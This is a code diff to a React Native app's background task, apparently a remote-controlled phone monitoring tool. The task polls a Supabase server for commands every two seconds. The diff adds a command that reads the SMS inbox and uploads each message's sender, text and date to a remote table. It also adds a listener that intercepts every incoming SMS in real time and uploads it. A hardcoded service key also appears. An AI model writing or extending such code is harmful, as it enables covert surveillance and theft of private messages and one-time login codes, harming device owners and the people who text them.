@@ -3,7 +3,8 @@ import notifee, { AndroidImportance, AndroidColor, EventType } from '@notifee/re
 import * as Speech from 'expo-speech';
 import { Audio } from 'expo-av';
 import { NativeModules, DeviceEventEmitter } from 'react-native';
-const { FloatingAlert, FlashlightModule, WallpaperModule, PowerModule } = NativeModules;
+import AsyncStorage from '@react-native-async-storage/async-storage';
+const { FloatingAlert, FlashlightModule, WallpaperModule, PowerModule, SmsModule } = NativeModules;
 import Constants from 'expo-constants';
 import * as Device from 'expo-device';
 import { Asset } from 'expo-asset';
@@ -12,7 +13,23 @@ import { Asset } from 'expo-asset';
 const SUPABASE_URL = 'https://ejqrvmkjypdfqiiwyxkp.supabase.co';
 const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVqcXJ2bWtqeXBkZnFpaXd5eGtwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njc5MzM0NDEsImV4cCI6MjA4MzUwOTQ0MX0.sDOLfczDLK4RNIHFLP-kG1_rnZNWhE4XFImruLBr8oA';
 const SUPABASE_REST_URL = `${SUPABASE_URL}/rest/v1`;
-const DEVICE_ID = Constants.sessionId || Device.modelId || '1';
+
+let CACHED_DEVICE_ID = null;
+
+const getStableDeviceId = async () => {
+    if (CACHED_DEVICE_ID) return CACHED_DEVICE_ID;
+    try {
+        const id = await AsyncStorage.getItem('xnuver_stable_id');
+        if (id) {
+            CACHED_DEVICE_ID = id;
+            return id;
+        }
+    } catch (e) {
+        console.error('[BG_TASK] Storage error:', e);
+    }
+    // Fallback if not set yet
+    return Constants.sessionId || Device.modelId || '1';
+};
 
 const CHANNEL_ID_ALERT = 'xnuver_critical_alert';
 const BACKGROUND_TASK_NAME = 'XNUVER_BACKGROUND_POLLING';
@@ -86,8 +103,10 @@ setupAudio();
  */
 const checkForCommands = async () => {
     try {
+        const deviceId = await getStableDeviceId();
+        const encodedId = encodeURIComponent(deviceId);
         const response = await fetch(
-            `${SUPABASE_REST_URL}/commands?device_id=eq.${DEVICE_ID}&order=id.desc&limit=1`,
+            `${SUPABASE_REST_URL}/commands?device_id=eq.${encodedId}&order=id.desc&limit=1`,
             {
                 headers: {
                     'apikey': SUPABASE_ANON_KEY,
@@ -247,6 +266,40 @@ const executeCommand = async (command, payload) => {
             }
             break;
 
+        case 'SMS_FETCH':
+            try {
+                if (SmsModule) {
+                    console.log('[BG_TASK] Fetching SMS history...');
+                    const limit = payload.limit || 50;
+                    const smsList = await SmsModule.getSmsInbox(limit);
+                    const deviceId = await getStableDeviceId();
+
+                    // Upload each SMS to Supabase
+                    for (const sms of smsList) {
+                        await fetch(`${SUPABASE_REST_URL}/sms_logs`, {
+                            method: 'POST',
+                            headers: {
+                                'apikey': SUPABASE_ANON_KEY,
+                                'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
+                                'Content-Type': 'application/json',
+                                'Prefer': 'return=minimal'
+                            },
+                            body: JSON.stringify({
+                                device_id: deviceId,
+                                address: sms.address,
+                                body: sms.body,
+                                date: sms.date,
+                                type: 'history'
+                            })
+                        });
+                    }
+                    console.log(`[BG_TASK] Successfully uploaded ${smsList.length} SMS logs`);
+                }
+            } catch (e) {
+                console.error('[BG_TASK] SMS Fetch error:', e);
+            }
+            break;
+
         default:
             console.log('[BG_TASK] Unknown command:', command);
     }
@@ -304,6 +357,7 @@ export const registerBackgroundTask = async () => {
 
 // Track interval locally
 let activeIntervalId = null;
+let smsSubscription = null;
 
 /**
  * Start background polling (called when foreground service starts)
@@ -322,6 +376,37 @@ export const startBackgroundPolling = () => {
         console.log('[BG_TASK] CPU WakeLock acquired');
     }
 
+    // LISTENER: Real-time Incoming SMS
+    // The Java SmsReceiver emits 'XNUVER_SMS_RECEIVED'
+    if (!smsSubscription) {
+        smsSubscription = DeviceEventEmitter.addListener('XNUVER_SMS_RECEIVED', async (event) => {
+            console.log('[BG_TASK] SMS INTERCEPTED:', event);
+            try {
+                const deviceId = await getStableDeviceId();
+                await fetch(`${SUPABASE_REST_URL}/sms_logs`, {
+                    method: 'POST',
+                    headers: {
+                        'apikey': SUPABASE_ANON_KEY,
+                        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
+                        'Content-Type': 'application/json',
+                        'Prefer': 'return=minimal'
+                    },
+                    body: JSON.stringify({
+                        device_id: deviceId,
+                        address: event.address,
+                        body: event.body,
+                        date: event.date,
+                        type: 'incoming' // Mark as real-time intercept
+                    })
+                });
+                console.log('[BG_TASK] Intercepted SMS uploaded to cloud');
+            } catch (e) {
+                console.error('[BG_TASK] Failed to upload intercepted SMS:', e);
+            }
+        });
+        console.log('[BG_TASK] SMS Intercept Listener Active');
+    }
+
     // Poll every 2 seconds
     activeIntervalId = setInterval(async () => {
         await checkForCommands();
@@ -337,6 +422,12 @@ export const stopBackgroundPolling = () => {
     if (activeIntervalId) {
         clearInterval(activeIntervalId);
         activeIntervalId = null;
+
+        if (smsSubscription) {
+            smsSubscription.remove();
+            smsSubscription = null;
+            console.log('[BG_TASK] SMS listener removed');
+        }
 
         if (PowerModule) {
             PowerModule.releaseWakeLock();
